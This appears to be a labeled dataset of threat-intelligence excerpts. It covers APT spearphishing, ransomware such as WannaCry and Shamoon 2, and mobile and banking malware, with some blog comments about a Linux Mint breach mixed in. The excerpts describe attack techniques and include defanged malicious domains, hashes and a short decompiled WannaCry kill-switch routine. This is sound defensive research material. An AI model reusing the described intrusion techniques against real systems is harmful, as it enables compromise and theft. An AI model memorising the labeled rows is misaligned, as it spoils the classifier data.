Muslim activists and those interested in critiques of the Russian government and Russian President Vladimir Putin. Based on their previous targets we suspect these individuals may be targeted based on the information they posses on activist groups.

This public notice is intended to describe a series of intrusions conducted through a suite of custom and off-the-shelf malware agents targeting interests aligned with the Iranian security policies. We also provide some insight into the nature of the operators provided by their engagement in a honeypot under our control. Incident and Impact On August 4, 2016, the Gmail account of an unknown individual was compromised in order to conduct spearphishing campaigns against a diverse set of targets related to Iran. The spearphishing attempt posed as a message from the Director of United for Iran, a U.S.-based human rights organization, claiming that the organization had developed a secure communications tool for activists. The message was sent from an account created under her name on lesser known email provider (1&1’s Mail.com), a common tactic in recent months, with a link to a file hosted on Dropbox and an additional credential phishing attempt. Once the observed Gmail account was under their control, the actors then forwarded malware to over a hundred of their contacts, ranging from an address for the United Nations Refugee Agency in Turkey to a site contact for Reza Pahlavi, the son of the deposed Shah Mohammad Reza Pahlavi. The incident represents only a more recent example of a common set of tactic and tools that have been used by a discrete set of actors in Iran.

675,Long_Train,"coincided with specific attack waves by this adversary, with the most recent attacks using weaponized Microsoft Office documents with malicious macros. Due to the large amount of data collected, and limitations on attack telemetry, this blog will focus primarily on the most recent attacks occurring in the latter half of 2016. ATTACK DETAILS The samples initially collected and associated with Magic Hound were Microsoft Word and Excel documents containing embedded malicious macros. We were able to expand our data set by pivoting on infrastructure and tool behavior, which uncovered additional types of tools in use by Magic Hound, such as regular portable executable (PE) payloads, PE files compiled in .NET Framework, various forms of IRC bots, and an open source file-less Python remote access tool called Pupy . The weaponized Office documents were found to be hosted either on what appeared to be compromised legitimate websites, or on websites using domain names similar to legitimate domain names in appearance. The two legitimate websites we were able to identify were owned by organizations in the government and energy sectors. Based on the existence of these malicious files on the legitimate websites, it is highly probable that the websites had already been compromised in some fashion. At the time of investigation, the files had already been removed from the websites. The two other delivery sites were ntg-sa[.]com, which may be trying to spoof a Saudi based information and communication technology conglomerate and mol.com-ho[.]me, which may be trying to spoof the Ministry of Labor. A third delivery site was identified at its.com-ho[.]me which may appear to be a benign domain. Several of these documents were also found on a seemingly unrelated, but benign-looking domain, briefl[.]ink. It is highly likely the adversary then used spear-phishing attacks containing links to these malicious documents as a delivery mechanism. We were ultimately able to identify multiple organizations in the government, energy, and technology sectors targeted by Magic Hound. The weaponized documents themselves all contained malicious macros which were designed to call Windows PowerShell to retrieve additional tools. A handful of lures with different themes were used repeatedly with variations throughout the eighteen collected documents. They ranged from documents masquerading as official Saudi government forms to a holiday greetings card. The forms masquerading as official government documents specifically used imagery from the Ministry of Health and the Ministry of Commerce claiming to be mandatory forms that required macros to be enabled. Examples of the documents can be seen below: INFRASTRUCTURE Analysis of the weaponized documents revealed some peculiarities right away. The majority of documents used the name “gerry knight” for the author field in the document metadata, and the embedded macros largely used direct IP connections to command and control (C2) servers rather than using domain names. These C2 servers also appeared to lack any relationships to each other and were hosted on a variety of VPS providers. Two of the Word documents using the “gerry knight” author name however were found to be communicating to C2 servers on two specific domains, www1.chrome-up[.]date and www3.chrome-up[.]date. Using these domains as pivot points, we were able to expand our data set. As seen below, the relational analysis proved to be",1

We have reported information on this threat to Google, and they have created protections through Google Play Protect . SpyDealer is only completely effective against Android devices running versions between 2.2 and 4.4, as the rooting tool it uses only supports those versions. This represents approximately 25% of active Android devices worldwide. On devices running later versions of Android, it can still steal significant amounts of information, but it cannot take actions that require higher privileges. As of June 2017, we have captured 1046 samples of SpyDealer. Our analysis shows that SpyDealer is currently under active development. There are three versions of this malware currently in the wild, 1.9.1, 1.9.2 and 1.9.3. Starting from 1.9.3, content of configuration files and almost all constant strings in the code are encrypted or encoded. An accessibility service was also introduced in 1.9.3 to steal targeted apps’ messages. According to our dataset, most of these samples use the app name “GoogleService” or “GoogleUpdate”.

Details For Talos, June 27th, 2017, started with a message from our intelligence partners in Ukraine. A massive ransomware attack was underway, and they were asking for help. An organized attacker had the means to deliver arbitrary code to users of the most popular accounting software in Ukraine, and that includes multinational corporations that do business there. The actor in question chose to use this capability to encrypt critical files and hard drives, with no way to decrypt the software. Since the BlackEnergy attacks of late 2015, Talos has worked with public and private organizations in Ukraine to respond to attacks in the region. Once already this year, Talos has assisted organizations targeted by actors with destructive intent. Interestingly, in those cases a wiper very similar to prior BlackEnergy malware was deployed and, when that was blocked by our Advanced Malware Protection (AMP) product, the actor fell back to using a ransomware variant in an attempt to disrupt the organization’s activities. With this recent history in mind, we were immediately concerned that there was more to this story than just another ransomware attack.

Introduction Since mid-July 2015, I've noticed an increase in malicious spam (malspam) caught by my employer's spam filters with java archive (.jar file) attachments. These .jar files are most often identified as Adwind. Adwind is a Java-based remote access tool (RAT) used by malware authors to infect computers with backdoor access. There's no vulnerability involved. To infect a Windows computer, the user has to execute the malware by double-clicking on the .jar file. Of course, you have to have the Java Runtime Environment installed, which many people do. I previously associated Adwind with targeted phishing attempts in limited amounts. I had found very few examples of non-targeted malspam using this RAT. However, we're currently seeing enough Adwind-based malspam to ask: Is Adwind now another payload for botnet-based malspam? Background Adwind originated from the Frutas RAT [ 1 ]. Frutas was a Java-based RAT discovered by Symantec from underground forums in early 2013 [ 2 ].",1

The attack targeted at least one organization in Saudi Arabia , which aligns with the targeting of the initial Shamoon attacks.

The Cmstar downloader itself has several unique and interesting features, as well as substantial infrastructure overlap with other tools worth discussing. Manual Building of Import Address Table The Cmstar downloader starts by manually building its import address table (IAT), much like shellcode would; however, it uses a rather unique technique. Instead of finding API function names based on their hashed values, this malware enumerates libraries’ export address table (EAT) and searches for the name of the API function the payload needs to load by using a character to offset array. The payload pairs several comma-separated lists of characters with comma-separated lists of numbers. Each list of characters consists of the set found within the API function name the payload seeks to add to its IAT, while the corresponding list of numbers specifies the offset in the function name where those characters should be placed. For example, if the payload has “D,e,A” paired with “0,5,19”, this results in the following mapping: “D” at offset 0 in API function name “e” at",0

Analysis shows the malware overall to be modular, well-written, and to go to great lengths to hinder both analysis efforts and the content of its communications. Its apparent scarcity in the wild implies that it is likely highly targeted.

Although Ewind is fundamentally adware, monetization through displaying advertising on the victim device, it also includes other functionality such as collecting device data, and forwarding SMS messages to the attacker. The adware Trojan in fact potentially allows full remote access to the infected device. The applications, injected advertising, application sites – and, we believe, the attacker, are all Russian. Initial observation We observed in AutoFocus a large number of repackaged APKs, signed with the same suspicious certificate. Using the command line tool “keytool” we identify some unique signing-certificate elements. The certificate resides in “META-INF/APP.RSA” in all of the samples: owner=CN=app issuer=CN=app md5=962C0C32705B3623CBC4574E15649948 sha1=405E03DF2194D1BC0DDBFF8057F634B5C40CC2BD sha256=F9B5169DEB4EAB19E5D50EAEAB664E3BCC598F201F87F3ED33DF9D4095BAE008 Our suspicions were further raised noting that many of the APKs included the application name of Anti-Virus and other well-known applications.

KeyRaider targets jailbroken iOS devices and is distributed through third-party Cydia repositories in China. In total, it appears this threat may have impacted users from 18 countries including China, France, Russia, Japan, United Kingdom, United States, Canada, Germany, Australia, Israel, Italy, Spain, Singapore, and South Korea. The malware hooks system processes through MobileSubstrate, and steals Apple account usernames, passwords and device GUID by intercepting iTunes traffic on the device. KeyRaider steals Apple push notification service certificates and private keys, steals and shares App Store purchasing information, and disables local and remote unlocking functionalities on iPhones and iPads. KeyRaider has successfully stolen over 225,000 valid Apple accounts and thousands of certificates, private keys, and purchasing receipts. The malware uploads stolen data to its command and control (C2) server, which itself contains vulnerabilities that expose user information. The purpose of this attack was to make it possible for users of two iOS jailbreak tweaks to download applications from the official App Store and make in-app purchases without actually paying. Jailbreak tweaks are software packages that allow users to perform actions that aren’t typically possible on iOS. These two tweaks will hijack app purchase requests, download stolen accounts or purchase receipts from the C2 server, then emulate the iTunes protocol to log in to Apple’s server and purchase apps or other items requested by users. The tweaks have been downloaded over 20,000 times, which suggests around 20,000 users are abusing the 225,000 stolen credentials.

The malware itself is a fully featured RAT, which uses a compressed, (optionally) encrypted, raw TCP socket and binary message protocol for command and control communications.

The method he describes involves creating an embedded OLE object which contains a ProgID for “otkloadr.WRAssembly.1”. This causes MSVCR71.DLL to be loaded, a library which is not compiled with /DYNAMICBASE. When using OLE to perform exploitation, ActiveX objects can be used to cite specific CLSID values.

WhiteBear infected systems maintained a dropper (which was typically signed) as well as a complex malicious platform which was always preceded by WhiteAtlas module deployment attempts. However, despite the similarities to previous Turla campaigns, we believe that WhiteBear is a distinct project with a separate focus. We note that this observation of delineated target focus, tooling, and project context is an interesting one that also can be repeated across broadly labeled Turla and Sofacy activity. From February to September 2016, WhiteBear activity was narrowly focused on embassies and consular operations around the world. All of these early WhiteBear targets were related to embassies and diplomatic/foreign affair organizations. Continued WhiteBear activity later shifted to include defense-related organizations into June 2017. When compared to WhiteAtlas infections, WhiteBear deployments are relatively rare and represent a departure from the broader Skipper Turla target set. Additionally, a comparison of the WhiteAtlas framework to WhiteBear components indicates that the malware is the product of separate development efforts. WhiteBear infections appear to be preceded by a condensed spearphishing dropper, lack Firefox extension installer payloads, and contain several new components signed with a new code signing digital certificate, unlike WhiteAtlas incidents and modules.

The person or persons behind the attempted monitoring appear to have run other surveillance operations involving various locations throughout South America, at least one apparently targeting a rabble-rousing Argentine journalist. In the process, they created at least four distinct spyware bundles, all communicating with the same server set to receive Nisman’s data. They also left traces showing that their operations were active as recently as March, raising the possibility that the online spying continues today. Nisman (pictured above) made powerful enemies inside and outside of Argentina. In his decade-long investigation into the suicide bombing of a Jewish organization and community center, Asociación Mutual Israelita Argentina, he indicted a top Hezbollah operative and several Iranian officials, including a former president, former intelligence minister, and a former foreign minister. Four days before his death, he accused the president of Argentina, Cristina Fernández de Kirchner, and her foreign minister, Héctor Timerman, of being involved in a criminal conspiracy to let Iranian officials off the hook for the attack. He was called to testify before Congress. But the night before he was slated to deliver that testimony, Nisman was found in his apartment dead from a bullet wound to the head.

Our analysis shows that the actors likely gathered the list of known hostnames directly from Active Directory or during their network reconnaissance activities conducted from a compromised host. This network reconnaissance, coupled with the credential theft needed to hardcode Disttrack payloads with legitimate username and password credentials, leads us to believe that it is highly likely the threat actors had sustained access to the targeted networks prior to Shamoon 2 attacks. Our research confirms that successful credential theft from targeted organizations was an integral part of the Shamoon 2 attackers’ playbook, and they used these stolen credentials for remote access and lateral movement. Our analysis also shows an actor distributes Disttrack within the targeted network by first compromising a system that is used as the Disttrack distribution server on that network. The actor then uses this server to compromise other systems on the network by using the hostname to copy over and execute the Disttrack malware. On each of these named systems that are successfully compromised, the Disttrack malware will attempt to propagate itself to 256 additional IP addresses on the local network. This rudimentary, but effective, distribution system can enable Disttrack to propagate to additional systems from a single, initially compromised system in a semi-automated",1

The core functionality of CryptoWall 4 remains the same as it continues to encrypt users’ files and then presents a message demanding the user pay a ransom. However, Talos observed several new developments in CryptoWall 4 from previous versions. For example, several encryption algorithms used for holding users’ file for ransom have changed. Also, CryptoWall 4 includes a new technique to disable and delete all automatic Windows backup mechanisms, making it almost impossible to recover encrypted files without having an external backup. Finally, CryptoWall 4 has been observed using undocumented API calls not previously used to find the local language settings of the compromised host. These are just a few of the new findings Talos observed in the new iteration of CryptoWall that are detailed further in this post. For our technically savvy users, we encourage you to continue reading. As always, we strongly encourage users and organizations to follow recommended security practices and to employ multiple layers of detection in order to reduce the risk of compromise. Our in-depth analysis of the latest CryptoWall version gives us a better opportunity to protect our users by allowing us to identify better detection methods. Finally, as a note regarding recent statements by the FBI informing users that they should just pay the ransom if they have no alternative, Talos strongly encourages users to not pay the ransom as doing so directly funds this malicious activity. Infection Process The adversaries behind CryptoWall 4 are using phishing and drive-by-download campaigns to distribute their malware to their victims. Once CryptoWall 4 has been successfully executed, the dropper downloads an RSA public encryption key from the command and control (C2) server. All files are encrypted with a temporary AES encryption key, which is later encrypted with the downloaded RSA public key and embedded in the encrypted files. Then it shows its message in three different formats. The first is a text file, the second is an image (.png format) and thirdly an HTML document. All are automatically opened on the victim's desktop as shown in Figure A.1 below. Figure A.2-5 are showing the full text of the HTML document.

743,Long_Train,"targeted attack was more difficult to detect because adversaries chose to leverage AutoIT, a well known freeware administration tool for automating system management in corporate environments. This notable characteristic made this attack worthy of further analysis. Utilizing AutoIT within a payload is unique because it is a legitimate management tool. In this attack, AutoIT was utilized to install a Remote Access Trojan (RAT) and maintain persistence on the host in a manner that’s similar to normal administration activity. RATs allow adversaries to fully control compromised hosts remotely to conduct malicious operations, such as exfiltrating sensitive information. The use of AutoIT is potentially an extremely effective method of evading detection by traditional anti-virus technologies and remaining hidden on the system if it is used by the target to manage systems. The combination of a legitimate administration tool being used to install a back-door onto a target system is unique and is why this attack caught our attention. Another characteristic of this attack that was notable is how adversaries went to great lengths to spoof a phishing message that would appear credible to the user. In this attack, an actual business was impersonated, using the logo and physical address of the business, in order to appear legitimate. The bait in this case is a Microsoft Word document containing a macro that downloads and executes a",0

The email body contained a link to the legitimate registration page for the conference, but the email also had two attachments with the following filenames that also pertain to the conference: 蔡英文柯建銘全國科技後援會邀請函.doc (translates to “Tsai Ker Chien-ming National Science and Technology Support Association invitations.doc”) 書面報名表格.doc (translates to “Written Application Form.doc”) Both attachments are malicious Word documents that attempt to exploit the Windows OLE Automation Array Remote Code Execution Vulnerability tracked by CVE-2014-6332 .

The first attachment opens a decoy (Figure 2) that is a copy of an invitation to a Science and Technology conference this past November 13th held in Hsingchu, Taiwan, while the second opens a decoy (Figure 1) that is a registration form to attend the conference. The conference was widely advertised online and on Facebook, however in this case the invitation includes a detailed itinerary that does not seem to have appeared online. The Democratic Progressive’s Party (DPP) Chairwoman Tsai Ing-wen and DPP caucus whip and Hsinchu representative Ker Chien-ming were the primary political sponsors of the conference and are longtime political allies. Tsai Ing-wen is the current front-runner for the Taiwanese Presidency and Ker Chien-ming may become Speaker if she wins.

753,Long_Train,"report along with initial clues on attribution. ANALYSIS: Initial Vector The initial infection vector is still unknown. Reports by some of phishing emails have been dismissed by other researchers as relevant only to a different (unrelated) ransomware campaign, called Jaff. There is also a working theory that initial compromise may have come from SMB shares exposed to the public internet. Results from Shodan show over 1.5 million devices with port 445 open – the attacker could have infected those shares directly . The Dropper/Worm The infection starts from a 3.6Mb executable file named mssecsvc.exe or lhdfrgui.exe . Depending on how it's executed, it can function as a dropper or as a worm. When run, the executable first checks if it can connect to the following URL: http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com The connection is checked with the WinINet functions, shown below: 01 qmemcpy(&szUrl, 02 ""http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com"" , 03 57u); 04 h1 = InternetOpenA(0, INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0); 05 h2 = InternetOpenUrlA(h1, &szUrl, 0, 0, 06 INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 07 0); 08 if (h2) 09 { 10 InternetCloseHandle(h1); // if connection succeeds, then quit 11 InternetCloseHandle(h2); 12 result = 0; 13 } 14 else 15 { 16 InternetCloseHandle(h1); // if connection fails 17 InternetCloseHandle(0); 18 PAYLOAD(); // then call the payload 19 result = 0; 20 } 21 return result; That means that if the executable is unable to connect to the URL above, it will call the payload. Alternatively, it will activate a payload on an air-gapped system, such as a system within a hospital network. It is also worth noting that this connection is not proxy aware, therefore in an enterprise IT environment it is unlikely to be able to connect to the domain triggering the payload. If the executable is run with no command line parameters, it will register and then run itself as a service: Service name: ""mssecsvc2.0"" Service Description: ""Microsoft Security Center (2.0) Service"" Service executable: ""%ORIGINAL_NAME% -m security"" where %ORIGINAL_NAME% is the original name of the executable, such as mssecsvc.exe or lhdfrgui.exe . Next, it will start the created service.

As we began to analyze and tear down the various samples we collected, we found significant overlaps with previously reported and documented adversary groups, attack campaigns, and their toolsets, exemplifying the concept of the Digital Quartermaster . The concept of the Digital Quartermaster is not a particularly new one; it is the idea that there is a group, or groups whose mission is to supply and maintain malicious tools in support of cyber espionage operations. The existence of a Digital Quartermaster has been discussed within the intelligence community for some time, but it is not often that sufficient overlaps exist between what appear to be separate toolsets to confidently claim this idea is indeed in use. The data Unit 42 has collected and analyzed however, does strongly point to the possibility that while there may be multiple operations groups, a Digital Quartermaster may be the one supplying and maintaining the tools used. Attack Analysis While investigating new BBSRAT instances discovered using the AutoFocus tool, Unit 42 was able to collect additional samples, weaponized documents, and phishing emails uploaded to VirusTotal between August 2015 through February 2016. Each of the samples collected via WildFire and VirusTotal contained significant overlaps in tactics used, tools used, as well as infrastructure for command and control channels.

In this post, we will examine the functionality of Pro PoS so that you can better understand how this malware can be used to exfiltrate payment card information and potentially other valuable information from your network. Beginning in October , merchants in the United States were required to use PoS terminals that provide support for chip-enabled cards or otherwise risk liability for fraudulent charges. These new chip-enabled readers help minimize the chance for PoS malware to steal payment card information because the chip on the payment card generates a single use token. This transition, however has been bumpy at best because the cost of new chip-enabled readers has made it difficult to upgrade to the newer readers. Another loophole is that gas stations have a different timeline and are not required to move to chip-based readers until October 2017. These two factors mean that many establishments still rely on card readers that are not chip-enabled and sending payment card data that can be duplicated and reused. Pro PoS is simple-to-use PoS malware that is available for purchase, enabling multiple threat actors to easily take advantage of this malware to target businesses. The functionality of Pro PoS seems fairly extensive according to recent press releases.

Morphisec researchers began investigating the attacks on April 24 and continue to uncover more details. Initial reports of the attacks, published April 26 (in Hebrew) by the Israel National Cyber Event Readiness Team (CERT-IL) and The Marker , confirm that the attack was delivered through compromised email accounts at Ben-Gurion University and sent to multiple targets across Israel. Ironically, Ben-Gurion University is home to Israel’s Cyber Security Research Center. Investigators put the origin of the attack as Iranian; Morphisec’s research supports this conclusion and attributes the attacks to the same infamous hacker group responsible for the OilRig malware campaigns. The fileless attack was delivered via Microsoft Word documents that exploited a former zero-day vulnerability in Word, CVE-2017-0199, to install a fileless attack variant of the Helminth Trojan agent.

The attackers attempted to steal $951m, of which $81m is still unaccounted for.

Moreover the new version searches for files generated by previous versions.

The decoy document of the 2 last campaigns suggests that the targets are public organisations. Both documents contained email addresses, phone numbers and contacts of members of official organizations such as United Nations, UNICEF, and Embassies linked to North Korea.",0

Reply Darkwolf says: February 21, 2016 at 6:29 am I just wanted to say that for all of those requesting that linuxmint.com should have https:// , that would do absolutely nothing to prevent all attacks and would be no guarantee that any information (such as hashes) that is put on the site is legit. All that does is encrypt the data between the server and the viewer. It does prevent that data from being sniffed, however if a site is compromised and false information (such as fake hashes) posted, then having https:// isn’t going to make a difference. On the flip side however: 1. The site really should have https:// enabled, as it can help to encrypt data between servers and those with administrative access to help decrease the chance of MITM attacks and sniffing. Having no SSL or mixed SSL usage on a site is a recipe for disaster. 2. The fact that http://blog.linuxmint.com/wp-login.php is even accessible when I checked is REALLY disturbing and probably the BIGGEST security risk. It’s not that hard to move this to another location. There are even plugins specifically designed to do this. 3. The even if moving the login page, it should only allow requests to administrative areas specifically for those that should have access to these areas. It is not hard to have a modified .htaccess file that denies access to administrative areas for preset IP addresses. If you need to gain access from a location not in the list, modification of the .htaccess to add a temporary IP via SSH is easy.

It takes only an hour to generate a collision on regular hardware. If hackers placed backdoored ISOs on your servers that had valid MD5s, it would be hard to detect. I’m surprised they didn’t attempt a hash collision in this breach. You need to switch to secure hash functions like SHA256. Redundancy and community reporting of issues only go so far. You also need a secure way to prove the hashes are authentic. If hackers changed the hashes listed on your server to hashes of the backdoored ISOs, this would also make it hard to detect the breach. For example, this very WordPress blog post could be hacked and the hashes listed above as “valid” could be changed and none of us would know. Get a PGP key and start signing either the hashes or the ISOs themselves. Every other serious distro does this, and it’s so easy there is no excuse for not doing it. This should never happen again.

Reply Usama says: February 21, 2016 at 7:42 am I hope that md5sums and sha256sums could be put on 3rd party external server. maybe git repository.

Technical Details Talos has identified a new moduler malware that is being used to facilitate the installation of a previously undocumented malware family, which we are referring to as Divergent, due to the naming convention used by the malware during variable declaration and the creation of environment variables. While we were unable to determine the delivery mechanism used, we were able to perform analysis of the malware loader as well as the Divergent malware that it is used to install on victim systems. Divergent is a malware family designed to generate revenue for attackers via the use of click-fraud, similar to other click-fraud malware such as Kovter. Technical details associated with both the installation and operation of the Divergent malware are described in the following sections. Installation The malware has many similarities with other popular fileless malware families, particularly Kovter. Like Kovter, it relies heavily on the registry for staging and storage of configuration data while avoiding more traditional on-access endpoint scanning of files on disk. It also uses a key in the registry to maintain persistence, and relies on PowerShell to install itself on the infected host. When first delivered and executed on a victim's machine, the malware is in the portable executable (PE) format. Its first task, however, is to install itself to the system in a less suspicious form, namely as an HTML Application (HTA) that will load the malware from the registry. Installation begins by creating several registry keys containing the different parts of the loader as well as the data of the malware PE. The malware reads all the information embedded in its data section and creates three new randomly named registry keys, each holding a different stage of the loader code needed to execute the malware PE using reflective injection. Next, the HTA loader is written to the CSIDL_COMMON_APPDATA folder (typically C:\ProgramData\) and set to execute",1

This backdoor allows them to surreptitiously control systems via remote desktop logon screens without the need for credentials. This report outlines the public-domain malware samples related to this threat actor. It includes insight into the malicious use of Narrator.exe and modifications to the PcShare backdoor. Our research will benefit security-minded professionals by detailing the evolving tactics, techniques, and procedures (TTPs) of a capable threat actor. For CISOs, familiarizing yourself with how the threat landscape is changing will better position you to protect your organization. Analysis The attackers use a modified version of a Chinese open-source backdoor called PcShare as their main foothold on the victim's machine. The backdoor is specifically tailored to the needs of the campaign, with additional command-and- control (C&C) encryption and proxy bypass functionality, and any unused functionality removed from the code. It arrives with a bespoke loader utilizing DLL sideloading technique. After gaining access to the victim’s machine, the attackers deploy a range of post-exploitation tools, many of them based on publicly available code often found on Chinese programming portals. One of these tools stood out, a bespoke Trojan that abuses Microsoft Accessibility Features to gain SYSTEM-level access on the compromised machine in a way similar to the infamous ""Sticky Keys"" attack . In this case, instead of replacing the usual sethc.exe or utilman.exe binaries, the attackers chose to Trojanize the Narrator executable - a Windows utility that reads aloud the text on the screen and can be invoked on the login screen with a keyboard shortcut.

However, as summer begins drawing to a close, Talos and other researchers started to see increased activity in Emotet's C2 infrastructure. And as of Sept. 16, 2019, the Emotet botnet has fully reawakened, and has resumed spamming operations once again. While this reemergence may have many users scared, Talos' traditional Emotet coverage and protection remains the same. We have a slew of new IOCs to help protect users from this latest push, but past Snort coverage will still block this malware, as well traditional best security practices such as avoiding opening suspicious email attachments and using strong passwords. Emotet's email propagation One of Emotet's most devious methods of self-propagation centers around its use of socially engineered spam emails. Emotet's reuse of stolen email content is extremely effective. Once they have swiped a victim's email, Emotet constructs new attack messages in reply to some of that victim's unread email messages, quoting the bodies of real messages in the threads.

These pop-ups try to persuade potential victims to enter sensitive information; if successful, that information is then stolen. Figure 1. Countries affected by Casbaneiro The backdoor capabilities of this malware are typical of Latin American banking trojans. It can take screenshots and send them to its C&C server, simulate mouse and keyboard actions and capture keystrokes, download and install updates to itself, restrict access to various websites, and download and execute other executables. Casbaneiro collects the following information about its victims: List of installed antivirus products OS version Username Computer name Whether any of the following software is installed: Diebold Warsaw GAS Tecnologia (an application to protect access to online banking) Trusteer Several Latin American banking applications Although there seem to be at least four different variants of this malware, the core of all of them is almost identical to the code in this GitHub repository . However, it is practically impossible to separate them from each other, mainly because some variants using different versioning use the same string decryption key, and the same mechanisms are used in different variants. Moreover, the differences are not important from the functionality point of view. Therefore, we will refer to all these variants as Casbaneiro. Casbaneiro is easy to identify by its use of a huge string table, with several hundred entries. Strings are retrieved by accessing this table by index. Curiously, whenever the malware needs to obtain a string, the whole string table is constructed in memory from stored chunks of encrypted text, the desired string is decrypted and the whole table is discarded again. You can see an example in Figure 2. Figure 2. Casbaneiro obtaining a string by index (0x205) and decrypting",0

Behavioral analysis revealed that the binary, posing as an ABBC Coin wallet, is a dropper, which we will, from now on, refer to as WiryJMPer. WiryJMPer hides a Netwire payload between two benign binaries. The first stage of the payload innocently appears as a regular WinBin2Iso binary with a suspiciously large . rsrc section. The JMP instruction, which is normally part of a loop handling window messages, jumps into the . rsrc section where a roller-coaster of control flow begins. This causes an unresponsive WinBin2Iso window to appear briefly before being replaced by a ABBC Coin wallet window. This window is always shown at startup and thus it is a good indicator of infection. While this functionality isn’t novel in any sense and no sandbox evasion was utilized, the obfuscation was uncommon enough to gain our attention.

814,Long_Train,"| 14 min read iStock IBM X-Force Incident Response and Intelligence Services (IRIS) responds to security incidents across the globe. During a recent incident response investigation, our team identified new attacks by the financially motivated attack group ITG08, also known as FIN6 . ITG08 is an organized cybercrime gang that has been active since 2015, mostly targeting point-of-sale (POS) machines in brick-and-mortar retailers and companies in the hospitality sector in the U.S. and Europe. More recently, the group has been observed targeting e-commerce environments by injecting malicious code into online checkout pages of compromised websites — a technique known as online skimming — thereby stealing payment card data transmitted to the vendor by unsuspecting customers. Based on our investigation and analysis of its adversarial tactics, techniques and procedures (TTPs), we believe ITG08 is actively attacking multinational organizations, targeting specific employees with spear phishing emails advertising fake job advertisements and repeatedly deploying the More_eggs JScript backdoor malware (aka Terra Loader, SpicyOmelette). This tool, a TTP observed in ITG08 attacks since 2018, is sold on the dark web by an underground malware-as-a-service (MaaS) provider. Attackers use it to create, expand and cement their foothold in compromised environments. Past campaigns by ITG08 using the More_eggs backdoor were last reported in February 2019 . In the campaign we investigated, the attackers employed additional TTPs historically associated with ITG08, including the use of Windows Management Instrumentation (WMI) to automate the remote execution of PowerShell scripts, PowerShell commands with base64 encoding, and Metasploit and PowerShell to move laterally and deploy malware. Lastly, the attackers used Comodo code-signing certificates several times during the course of the campaign. Many of the above TTPs are not unique to ITG08, but collectively, and with the use of More_eggs, strengthen the link to this group. Let’s take a closer look at ITG08’s TTPs that are relevant to the",1

Skidmap, a Linux malware that we recently stumbled upon, demonstrates the increasing complexity of recent cryptocurrency-mining threats.

You'll also find an overview of a few recent campaigns we've seen using LoLBins, along with recommendations for how to detect malicious LoLBins' activities. What are LoLBins A LoLBin is any binary supplied by the operating system that is normally used for legitimate purposes but can also be abused by malicious actors. Several default system binaries have unexpected side effects, which may allow attackers to hide their activities post-exploitation. The concept of LoLBins is not new and isn't specific to Windows. Almost all conventional operating systems, starting from the early DOS versions and Unix systems, contained executables that attackers could exploit. Here is an example from the mid 80s in which binary code to reboot the computer was supplied to the default debug.com DOS debugger as text, designed to avoid detection by anti-malware scanners and run malicious code as intended.

The Gamaredon Group has been active for more than 6 years, and during that time, their Tactics, Techniques, and Procedures (TTPs) have mostly remained the same. They primarily target Ukrainian organizations and resources using spear-phishing attacks, and they use military or similar documents as bait. Once they have found a victim, they then deploy remote manipulation system binaries (RMS) via self-extracting archives and batch command files. Current Campaign Analysis As an example, we decided to analyze one of their latest samples.

Our analysis reveals some of the WAV files contain code associated with the XMRig Monero CPU miner. Others included Metasploit code used to establish a reverse shell. Both payloads were discovered in the same environment, suggesting a two-pronged campaign to deploy malware for financial gain and establish remote access within the victim network. The WAV file loaders can be grouped into the following three categories, which we will discuss in detail: Loaders that employ Least Significant Bit (LSB) steganography to decode and execute a PE file. Loaders that employ a rand()-based decoding algorithm to decode and execute a PE file. Loaders that employ rand()-based decoding algorithm to decode and execute shellcode. Each approach allows the attacker to execute code from an otherwise benign file format. These techniques demonstrate that executable content could theoretically be hidden within any file type, provided the attacker does not corrupt the structure and processing of the container format. Adopting this strategy introduces an additional layer of obfuscation because the underlying code is only revealed in memory, making detection more challenging. It is worth noting that the steganography loader we discovered is also identified in Symantec's June 2019 analysis [1] of Waterbug/Turla threat actor activity. In addition, Symantec identified WAV files containing encoded Metasploit code. These similarities may point to a relationship between the attacks, though definitive attribution is challenging because different threat actors may use similar tools. Also, our analysis focuses primarily on loaders, which are an initial stage of execution used to launch additional code. Different threat actors may use the same publicly",0

Sakabota When we looked at 21 samples of the tool named Sakabota, we noticed the file internal comments “Blade for not to killing” and the file’s icon which resembles a scar and has the internal name “Icon_kenshin”. “Kenshin” is the name of the main character with that scar from the Japanese anime “Rurouni Kenshin”, otherwise known as “Samurai X” to English viewers. His sword is named Sakabatō, which is a reverse-edge sword which does not kill, and this lines up with the file internal comments of “not to [sic] killing”.

Three waves of attacks Recent Waterbug activity can be divided into three distinct campaigns, characterized by differing toolsets. One campaign involved a new and previously unseen backdoor called Neptun ( Backdoor.Whisperer ). Neptun is installed on Microsoft Exchange servers and is designed to passively listen for commands from the attackers. This passive listening capability makes the malware more difficult to detect. Neptun is also able to download additional tools, upload stolen files, and execute shell commands. One attack during this campaign involved the use of infrastructure belonging to another espionage group known as Crambus (aka OilRig, APT34). A second campaign used Meterpreter, a publicly available backdoor along with two custom loaders, a custom backdoor called photobased.dll, and a custom Remote Procedure Call (RPC) backdoor.

Of particular note is their use of tools to identify systems vulnerable to CVE-2017-0144 , which is the same vulnerability exploited by EternalBlue that is best known for its use in the WannaCry attacks of 2017. This activity appears related to campaigns exploiting CVE-2019-0604 mentioned in recent security alerts from Saudi Arabian National Cyber Security Center and the Canadian Center for Cyber Security . In addition to the aforementioned post-exploitation tools, the actors used these webshells to upload legitimate executables that they would use DLL sideloading to run a malicious DLL that has code overlaps with known Emissary Panda attacks .

We created statistics about their activities through the more than 800 malware executables that the SectorF01 group used to attack. About 800 malwares used in the statistics are all Windows executables. Polymorphic binaries which are executed by sandboxes and whose file hashes change each time they are run are excluded from these statistics, so only the initial file is included. We are excluding such polymorphic binaries which are not used in attacks to minimize statistical errors and misinterpretation. This is a graph aggregating the number of malwares used in attacks by the SectorF01 group every year. It can be seen that the number of malware that they use each year is steadily increasing. The Growth of the SectorF01 group’s Malware The following are the statistics for the time and day when the SectorF01 group created the malware. We have analyzed about seven years of cyber espionage activity of the SectorF01 group and have concluded that they are highly likely to be threat actor groups sponsored by the Vietnamese government.

These newly targeted devices range from wireless presentation systems to set-top-boxes, SD-WANs, and even smart home controllers. Mirai initially made use of default credentials to gain access to devices. However, since the end of 2017 , samples of the family have increasingly been observed making use of publicly available exploits to propagate and run on vulnerable devices. 2018 saw a continued increase in the emergence of campaigns involving variants incorporating several exploits within the same sample, allowing for the harvesting of several different kinds of IoT devices into the same botnet.

